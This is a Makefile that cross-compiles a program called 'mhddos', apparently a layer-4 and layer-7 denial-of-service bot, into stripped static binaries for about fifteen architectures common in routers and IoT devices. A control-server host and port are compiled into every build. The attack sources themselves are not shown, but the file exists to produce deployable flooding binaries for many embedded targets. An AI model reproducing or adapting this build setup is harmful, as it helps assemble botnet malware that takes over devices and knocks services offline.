SERVER_IP ?= 0.0.0.0
SERVER_PORT_NUM ?= 8443

CFLAGS = -Wall -Os -pthread -D_GNU_SOURCE \
         -DSERVER_HOST=\"$(SERVER_IP)\" \
         -DSERVER_PORT=$(SERVER_PORT_NUM) \
         -ffunction-sections -fdata-sections \
         -fno-asynchronous-unwind-tables -fno-ident \
         -fomit-frame-pointer -fmerge-all-constants \
         -fno-unwind-tables

LDFLAGS = -static -lpthread -lm \
          -Wl,--gc-sections -Wl,-s -Wl,-z,norelro

SRCS = main.c utils.c layer4.c layer7.c
TARGET = mhddos

CC_X86_64 = gcc
CC_X86_32 = i686-linux-gnu-gcc
CC_MIPS = mips-linux-gnu-gcc
CC_MIPSEL = mipsel-linux-gnu-gcc
CC_MIPS64 = mips64-linux-gnuabi64-gcc
CC_MIPS64EL = mips64el-linux-gnuabi64-gcc
CC_ARMV7 = arm-linux-gnueabihf-gcc
CC_ARM64 = aarch64-linux-gnu-gcc
CC_PPC = powerpc-linux-gnu-gcc
CC_PPC64 = powerpc64-linux-gnu-gcc
CC_PPC64LE = powerpc64le-linux-gnu-gcc
CC_SH4 = sh4-linux-gnu-gcc
CC_SPARC64 = sparc64-linux-gnu-gcc
CC_S390X = s390x-linux-gnu-gcc
CC_RISCV64 = riscv64-linux-gnu-gcc

all: x86_64 x86_32 mips mipsel mips64 mips64el armv7 arm64 ppc ppc64 ppc64le sh4 sparc64 s390x riscv64
	@echo ""
	@echo "========================================"
	@echo " PRONTO! SERVER=$(SERVER_IP):$(SERVER_PORT_NUM)"
	@echo "========================================"
	@echo ""
	@for f in $(TARGET)_*; do \
	    SIZE=$$(ls -lh $$f | awk '{print $$5}'); \
	    INFO=$$(file $$f | sed 's/.*ELF /ELF /'); \
	    echo "  $$SIZE  $$f  -  $$INFO"; \
	done

x86_64:
	$(CC_X86_64) $(CFLAGS) $(SRCS) -o $(TARGET)_x86_64 $(LDFLAGS)
	-strip -S --strip-unneeded $(TARGET)_x86_64 2>/dev/null || true

x86_32:
	$(CC_X86_32) $(CFLAGS) $(SRCS) -o $(TARGET)_x86_32 $(LDFLAGS)
	-i686-linux-gnu-strip -S --strip-unneeded $(TARGET)_x86_32 2>/dev/null || true

mips:
	$(CC_MIPS) $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS)
	-mips-linux-gnu-strip -S --strip-unneeded $(TARGET)_mips 2>/dev/null || true

mipsel:
	$(CC_MIPSEL) $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS)
	-mipsel-linux-gnu-strip -S --strip-unneeded $(TARGET)_mipsel 2>/dev/null || true

mips64:
	$(CC_MIPS64) $(CFLAGS) $(SRCS) -o $(TARGET)_mips64 $(LDFLAGS)
	-mips64-linux-gnuabi64-strip -S --strip-unneeded $(TARGET)_mips64 2>/dev/null || true

mips64el:
	$(CC_MIPS64EL) $(CFLAGS) $(SRCS) -o $(TARGET)_mips64el $(LDFLAGS)
	-mips64el-linux-gnuabi64-strip -S --strip-unneeded $(TARGET)_mips64el 2>/dev/null || true

armv7:
	$(CC_ARMV7) $(CFLAGS) $(SRCS) -o $(TARGET)_armv7 $(LDFLAGS)
	-arm-linux-gnueabihf-strip -S --strip-unneeded $(TARGET)_armv7 2>/dev/null || true

arm64:
	$(CC_ARM64) $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS)
	-aarch64-linux-gnu-strip -S --strip-unneeded $(TARGET)_arm64 2>/dev/null || true

ppc:
	$(CC_PPC) $(CFLAGS) $(SRCS) -o $(TARGET)_ppc $(LDFLAGS)
	-powerpc-linux-gnu-strip -S --strip-unneeded $(TARGET)_ppc 2>/dev/null || true

ppc64:
	$(CC_PPC64) $(CFLAGS) $(SRCS) -o $(TARGET)_ppc64 $(LDFLAGS)
	-powerpc64-linux-gnu-strip -S --strip-unneeded $(TARGET)_ppc64 2>/dev/null || true

ppc64le:
	$(CC_PPC64LE) $(CFLAGS) $(SRCS) -o $(TARGET)_ppc64le $(LDFLAGS)
	-powerpc64le-linux-gnu-strip -S --strip-unneeded $(TARGET)_ppc64le 2>/dev/null || true

sh4:
	$(CC_SH4) $(CFLAGS) $(SRCS) -o $(TARGET)_sh4 $(LDFLAGS)
	-sh4-linux-gnu-strip -S --strip-unneeded $(TARGET)_sh4 2>/dev/null || true

sparc64:
	$(CC_SPARC64) $(CFLAGS) $(SRCS) -o $(TARGET)_sparc64 $(LDFLAGS)
	-sparc64-linux-gnu-strip -S --strip-unneeded $(TARGET)_sparc64 2>/dev/null || true

s390x:
	$(CC_S390X) $(CFLAGS) $(SRCS) -o $(TARGET)_s390x $(LDFLAGS)
	-s390x-linux-gnu-strip -S --strip-unneeded $(TARGET)_s390x 2>/dev/null || true

riscv64:
	$(CC_RISCV64) $(CFLAGS) $(SRCS) -o $(TARGET)_riscv64 $(LDFLAGS)
	-riscv64-linux-gnu-strip -S --strip-unneeded $(TARGET)_riscv64 2>/dev/null || true

clean:
	rm -f $(TARGET)_*

.PHONY: all clean x86_64 x86_32 mips mipsel mips64 mips64el armv7 arm64 ppc ppc64 ppc64le sh4 sparc64 s390x riscv64
